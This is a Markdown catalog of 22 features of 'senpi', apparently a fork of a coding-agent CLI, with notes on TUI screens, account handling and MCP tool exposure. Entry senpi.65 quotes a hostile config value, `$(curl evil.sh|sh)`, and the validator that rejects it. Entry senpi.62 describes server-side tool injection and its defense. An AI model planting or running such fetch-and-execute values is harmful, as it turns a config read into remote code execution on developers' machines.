# senpi — chunk 3/5 (22 năng lực)

## senpi.45 Codex app-server protocol compatibility layer

- **where:** packages/coding-agent/src/modes/app-server/ (protocol/methods.ts, protocol/generated/v2/ 527 files, threads/, transports/, search/)
- **what:** 228 JSON-RPC methods/notifications matching the Codex app-server wire protocol, over stdio / Unix socket / authenticated WebSocket, with 619 generated protocol type files.
- **how:** Protocol is *generated* from a pinned Codex checkout (`generate-app-server-protocol.sh --from-checkout`), then wrapped by a hand-written app-facing facade (protocol/thread.ts, turn.ts, account.ts…) so runtime code never imports the generated tree directly.
- **solves:** Reusing an existing ecosystem's client apps (the Codex desktop/IDE clients) against a different agent runtime, without hand-maintaining hundreds of wire types.
- **port effort:** high — the generate-from-oracle + facade pattern is the reusable idea, not the 527 files | **idea only:** True
## senpi.46 Slash-command dispatch regression test

- **where:** packages/coding-agent/test/suite/builtin-slash-command-dispatch.test.ts
- **what:** A test that iterates BUILTIN_SLASH_COMMANDS and asserts each one never reaches `session.prompt()`.
- **how:** Stubs the InteractiveMode prototype via a Proxy that auto-vivifies vi.fn() for unknown members, installs the real `setupEditorSubmitHandler`, and asserts prompt/onInputCallback/showError are all uncalled per command.
- **solves:** A slash command with no dispatch branch silently falls through and is sent to the *model* as a user message — this is exactly how /thinking broke (#1437).
- **port effort:** low — cheap, high value; note the known gap in findings | **idea only:** True
## senpi.47 `$skill` token invocation alongside `/command`

- **where:** packages/tui/src/dollar-invocation-autocomplete.ts, dollar-invocation-autocomplete.ts docs in packages/tui/AGENTS.md
- **what:** A `$` at a whitespace boundary opens the same popup as `/`, but inserts bare `$name` for skills; anywhere but first position it offers skills only.
- **how:** `CombinedAutocompleteProvider.getMentionRanges(line)` reports resolved mentions so the editor styles each fragment independently of the cursor grapheme; shell-like `$HOME`/`$1` stay literal.
- **solves:** Skill invocation without eating a slash-command namespace, and without false-positives on shell variables users type naturally.
- **port effort:** low-medium — idea only; the mention-range styling split is the subtle part worth copying | **idea only:** True
## senpi.48 Settings menu generated from a single typed descriptor array

- **where:** packages/coding-agent/src/modes/interactive/components/settings-selector.ts (945 LOC), core/settings-manager.ts (78 KB)
- **what:** 35 settings entries, each a `{id, label, description, currentValue, values}` object or a `submenu` factory, rendered by one SettingsList component.
- **how:** Splat the array with 8 conditional `splice` insertions for image-dependent and always-available toggles; nested `submenu` factories return SelectSubmenu / ThemeSubmenu / WarningSettingsSubmenu.
- **solves:** One declarative list drives the whole settings UI, so adding a setting is a single array entry rather than a new dialog.
- **port effort:** low — idea only | **idea only:** True
## senpi.49 Two screen models over one component set

- **where:** packages/tui/src/tui-main-screen.ts, tui-alt-screen.ts (60 KB), layout.ts, layout-node.ts, ScrollView; design doc tui-plan.md (36 KB)
- **what:** `TuiMainScreen` delegates scrolling to the terminal; `TuiAltScreen` uses a constrained layout tree with a fixed bottom region (pending/status/widgets/editor/footer) and a scrollable transcript.
- **how:** The layout tree is rebuilt on every requested render while component state is preserved; leaf render caches (Markdown, Text, Image) are reused rather than duplicated. tui-plan.md explicitly enumerates what main-screen *cannot* do (sticky rows, nested scroll, side-by-side panes, off-screen repaint) and why.
- **solves:** Keeping normal terminal scrollback (users can scroll back with the wheel after exit) while still offering a fixed-input fullscreen mode — without pretending one model does both.
- **port effort:** high for the implementation; high value for the *document* — tui-plan.md's "why the two models differ" section is the reusable artifact | **idea only:** True
## senpi.50 Brand layer: one product name, many deployment identities

- **where:** packages/coding-agent/src/config.ts:564-577, packages/coding-agent/src/core/brand.ts, brand-dir-migration.ts, legacy-senpi-dir-migration.ts
- **what:** `BRAND` supplies name, command, configDir, envPrefix, userAgent, and an optional update channel; the whole app reads APP_NAME from it.
- **how:** `APP_NAME = BRAND?.name || piConfigName || "pi"`; unset brand falls back to `pi`, which is how the fork runs as both `senpi` and upstream-compatible `pi`.
- **solves:** Shipping a fork under a new name (and env var prefix, config dir, and update channel) without forking every string.
- **port effort:** low — small file, high leverage | **idea only:** True
## senpi.51 Account display names layered over opaque credential IDs

- **where:** packages/coding-agent/src/core/extensions/builtin/account/, account-display-name.ts, help-content.ts "Account display names" section, footer.ts accountFooterSuffix
- **what:** Users can rename accounts to human labels; the label is display-only and every operation (pins, removal, refresh, session affinity) still uses the unchanged ID.
- **how:** Labels are NFC-normalized, whitespace-collapsed, capped at 32 terminal columns, and compared with case/compatibility-form/invisible-codepoint/Cyrillic-lookalike folding so two visually identical labels cannot coexist. Environment accounts cannot be renamed.
- **solves:** Multi-account setups (5 Claude seats, N Cursor logins) where the raw IDs are unusable in a status bar. The anti-collision folding is the non-obvious part.
- **port effort:** low-medium — idea only; the lookalike-folding rule is worth copying verbatim | **idea only:** True
## senpi.52 Alt-screen transcript search

- **where:** packages/tui/src/alt-screen-search.ts (findAltScreenSearchMatches), keybindings tui.altScreen.search/searchNext/searchPrevious/searchClose
- **what:** Incremental search across the fullscreen transcript with match navigation, independent of the editor's own history search.
- **how:** Matches are computed over rendered segments and keyed by a stable match key so the highlight survives re-render.
- **solves:** Scrolling back through a long fullscreen session without leaving the mode or using the mouse.
- **port effort:** low — idea only | **idea only:** True
## senpi.53 CLI verb dispatch is route-first, not import-first

- **where:** packages/coding-agent/src/cli/deferred-commands.ts (documented rationale), cli/app-server-command.ts, cli/auth-command.ts
- **what:** argv[0] is compared against a tiny literal table so heavy command graphs stay behind dynamic import and are only paid for when selected.
- **how:** `PACKAGE_COMMAND_ARGV` uses `satisfies Record<PackageCommand, true>` so adding a PackageCommand member is a compile error rather than a dead route; the two string literals are pinned by test/suite/regressions/1781-main-lazy-modes.test.ts.
- **solves:** Every launch (interactive, print, RPC) was evaluating the 70-module app-server tree and package-manager CLI before argv was even parsed.
- **port effort:** low — idea only; the `satisfies`-pins-the-table trick is the reusable bit | **idea only:** True
## senpi.54 Session share as a secret GitHub gist

- **where:** packages/coding-agent/src/core/slash-commands.ts (entry 9), handled in interactive-mode.ts:4838
- **what:** /share uploads the session to a secret gist and prints the link.
- **how:** Listed in BUILTIN_SLASH_COMMANDS with description "Share session as a secret GitHub gist".
- **solves:** Getting a repro out of a live session with one keystroke.
- **port effort:** low — idea only | **idea only:** True
## senpi.55 HTML session export with an interactive viewer

- **where:** packages/coding-agent/src/core/export-html/ (template.html, template.css, template.js, ansi-to-html.ts, tool-renderer.ts), also reachable via `--export <file>`
- **what:** /export defaults to a self-contained HTML file; a 78 KB template.js and 23 KB template.css render the transcript with tool output, images, and ANSI converted to HTML.
- **how:** ansi-to-html.ts converts terminal output; the JS template handles interactivity client-side.
- **solves:** Sharing a readable transcript without the recipient running a terminal.
- **port effort:** medium — idea only | **idea only:** True
## senpi.56 Working indicator is fully user/extension-configurable

- **where:** packages/coding-agent/src/core/extensions/types.ts (setWorkingIndicator/setWorkingMessage/setWorkingVisible), modes/interactive/working-status.ts
- **what:** Custom spinner frames, hide-all (`frames: []`), static indicator (`frames: ["●"]`), custom working message, and visibility toggle — all via ctx.ui.
- **how:** The working row also carries elapsed time, the active-tool label, and the interrupt hint: `formatWorkingStatusMessage(msg, s, key)` → `"msg (1m 23s • esc to interrupt)"`.
- **solves:** Makes the "is it stuck?" question answerable at a glance, and lets integrations restyle it without a fork.
- **port effort:** low — idea only; the elapsed+tool+interrupt single-line format is worth copying | **idea only:** True
## senpi.57 Per-provider account footer with HRW slot prediction

- **where:** packages/coding-agent/src/modes/interactive/components/footer.ts (accountFooterSuffix), packages/coding-agent/src/core/footer-data-provider.ts
- **what:** The footer shows `@label` for the credential slot that will actually serve this session, computed with rendezvous hashing — and only when the provider pools more than one slot.
- **how:** `rendezvousOrder(sessionId, slots, sha256 → readBigUInt64BE)` picks the same winner the rotation engine will, so the label is a prediction, not a guess.
- **solves:** In a 5-account rotation, the user can see which seat is billing this turn before it happens.
- **port effort:** medium — idea only | **idea only:** True
## senpi.58 Bash prefix modes in the editor

- **where:** packages/coding-agent/src/modes/interactive/interactive-mode.ts:4590, 4966-4977
- **what:** `!` runs bash and adds command+output to context; `!!` runs it without adding to context; the editor border/mode indicator tracks bash mode live.
- **how:** `isBashMode = text.trimStart().startsWith("!")`, recomputed on every editor change with a was/is diff so only transitions re-render.
- **solves:** Shell access without a separate tool call round-trip, with an explicit opt-out of context pollution.
- **port effort:** low — idea only | **idea only:** True
## senpi.59 Shortest-path shortcut overlay on empty editor

- **where:** packages/coding-agent/src/modes/interactive/components/shortcut-overlay.ts
- **what:** Pressing `?` on an empty editor shows a two-column keyboard shortcut grid; any key dismisses it.
- **how:** `shouldShowShortcutOverlay` requires prevText==="" && nextText==="?" && inputKind==="typed"; `classifyEditorInput` treats a >1-char jump as a paste so pasting "?" never triggers it. All labels come from `keyHint(keybindingId, …)`.
- **solves:** Zero-friction keybinding discovery that respects the user's remaps.
- **port effort:** low — idea only; the paste-vs-typed guard is the non-obvious part | **idea only:** True
## senpi.60 Four bundled JSON themes plus an automatic light/dark mode

- **where:** packages/coding-agent/src/modes/interactive/theme/ (4 .json + theme-schema.json 9.6 KB), theme-controller.ts, terminal-theme-cache.ts; packages/tui/src/terminal-colors.ts (parseOsc11BackgroundColor, parseTerminalColorSchemeReport)
- **what:** dark, light, grok-day, grok-night as JSON assets, plus an "Automatic" mode that queries the terminal's OSC color-scheme report and picks per appearance.
- **how:** ThemeSubmenu has single/automatic modes; `parseAutoThemeSetting` encodes the pair as "light/dark". Themes are copied by build scripts, never symlinked.
- **solves:** Theme that follows the terminal's own appearance instead of fighting it.
- **port effort:** low — idea only; OSC color-scheme query support is broadly reusable | **idea only:** True
## senpi.61 MCP 3-mode exposure policy (direct / search / proxy) with an auto threshold

- **where:** packages/coding-agent/src/core/extensions/builtin/mcp/expose/policy.ts (95 lines) + config-schema.ts:47 + expose/tier-b.ts
- **what:** Every configured MCP server is classified into one of three exposure modes. `direct` registers all tools immediately; `search` registers the full catalog but keeps only `directTools` active, promoting the rest on demand via a shared `tool_search`; `proxy` hides the whole catalog behind a single gateway tool. `auto` picks direct when the filtered catalog is <= `settings.searchThreshold` (default 10), else search.
- **how:** Pure function `computeMcpExposurePolicy(entries, config, settings) -> {activeEntries, filteredEntries, mode, reason, registeredEntries, warnings}`. The `auto` branch structurally has no path to `proxy`.
- **solves:** A 392-tool MCP server would otherwise blow the context window on every turn. The policy makes catalog size nearly free until the model actually asks.
- **port effort:** MEDIUM. The idea ports cleanly; the code does not — omp's MCP is hand-rolled with a different substrate (see findings). Expect to reimplement the policy against omp's `packages/coding-agent/src/mcp/manager.ts` + `tool-bridge.ts`. | **idea only:** True
## senpi.62 Rug-pull defense on list_changed

- **where:** notifications.ts, service-tools-changed.ts, active-set.ts (`registerToolsPreservingActiveSet`)
- **what:** When a server pushes `notifications/tools/list_changed`, newly-added tools enter INACTIVE and are never auto-activated; only `directTools` entries are active immediately. Removed tools are force-dropped and replaced with a tombstone definition so a stale `execute()` returns a clean `isError` instead of throwing.
- **how:** Active-set is snapshotted via `getActiveTools()` and restored via `setActiveTools()` around `registerTool` calls, so registering never widens the active set.
- **solves:** A compromised or merely-upgraded MCP server can silently add a destructive tool mid-session and have the model call it. This makes server-side tool injection inert by default.
- **port effort:** LOW-MEDIUM. Small, self-contained, high value. Portable as a pattern regardless of substrate. | **idea only:** True
## senpi.63 Single-flight MCP session attach + history rehydration

- **where:** mcp/service.ts, mcp/startup-race.ts (201 lines), mcp/reconnect.ts
- **what:** `attachPromise` memoizes the in-flight `attachSession` so concurrent `before_agent_start` handlers await the original attach instead of starting a second one that would collect an empty catalog. For resumed sessions, `#rehydrateFromSessionHistory` runs at attach time so the very first wire payload already contains previously-promoted tools; `maybeRehydrateFromHistory` on the `context` event is a safety-net replay.
- **how:** Memoized promise + a startup-race guard; test/suite/startup-race-single-registration.test.ts and startup-race.test.ts pin the behavior.
- **solves:** Two lifecycle hooks both trying to connect the same server races the transport, loses the tool catalog, and leaves a half-initialized connection.
- **port effort:** LOW. ~30 lines of coordination logic. Idea-only but trivially reimplementable. | **idea only:** True
## senpi.64 OAuth 2.1 for MCP with hardened cross-process token storage

- **where:** mcp/auth/ (9 files, incl. token-store.ts, oauth.ts, oauth-refresh.ts, callback.ts) + oauth/pkce.ts
- **what:** Full OAuth 2.1: discovery, PKCE S256, RFC 8707 resource binding, loopback callback or paste flow, and a `client_credentials` flow for headless machine-to-machine. Tokens persist at `<agentDir>/mcp-auth/<sha256(serverUrl)>/tokens.json` — the server URL is hashed so the path leaks nothing — with the directory at 0700 and files at 0600, written via tmp+rename, guarded by a cross-process `proper-lockfile` (retries 50, stale 30s).
- **how:** `hashServerUrl` = sha256; `McpTokenStore` uses `mkdirSync(mode 0o700)` + explicit `chmodSync` (not just umask) because mkdir's mode is masked by the current umask.
- **solves:** Refresh races across concurrent agent processes corrupt token state, and a revoked-token cascade (token family invalidation) is exactly the case that exposes it — hence the test-only `disableLock` escape hatch to demonstrate the failure it prevents.
- **port effort:** LOW-MEDIUM for the storage hardening (omp already has `mcp/oauth-credentials.ts`); MEDIUM for the full flow set. | **idea only:** True
## senpi.65 Command-substitution rejection in MCP config values

- **where:** mcp/config.ts:329
- **what:** Config values support `${VAR}` interpolation from the trusted parent environment only. Any value that begins with `!` or contains `$(` throws `McpConfigValidationError` at load time.
- **how:** `if (value.trimStart().startsWith("!") || value.includes("$("))` — a two-token check that blocks both `!cmd` and `$(cmd)` shell forms.
- **solves:** `mcp.json` is a checked-in, human-edited file. Without this, a hostile PR adding `"env": {"X": "$(curl evil.sh|sh)"}` turns a config read into RCE.
- **port effort:** VERY LOW. One line. Should be adopted regardless of substrate. | **idea only:** True
## senpi.66 Deterministic collision-safe MCP tool naming under a hard 64-char cap

- **where:** mcp/expose/naming.ts, shared by both the full-tool builder and the Tier-B search catalog via `mapMcpCatalogNames`
- **what:** Tools are named `mcp_<server>_<tool>` with non-`[a-zA-Z0-9_-]` replaced by `_`. Names over 64 chars are middle-ellipsized, and post-normalization collisions (including `-` vs `_`, which providers treat as equivalent) get a deterministic `_` + sha1-4hex suffix rather than a random or index-based one.
- **how:** `buildMcpToolNames` groups by `matcherKey` (which folds `-` to `_`), warns on collision, then re-ellipsizes to `MCP_TOOL_NAME_MAX_LENGTH - suffix.length`. Determinism means a tool keeps its name across restarts, so transcripts stay readable.
- **solves:** Two servers exposing `list_files` collide; providers cap tool-name length; a non-deterministic suffix would rename tools on every reconnect and break prompt caching plus transcript references.
- **port effort:** VERY LOW. ~60 lines, no substrate dependency. Directly portable. | **idea only:** False
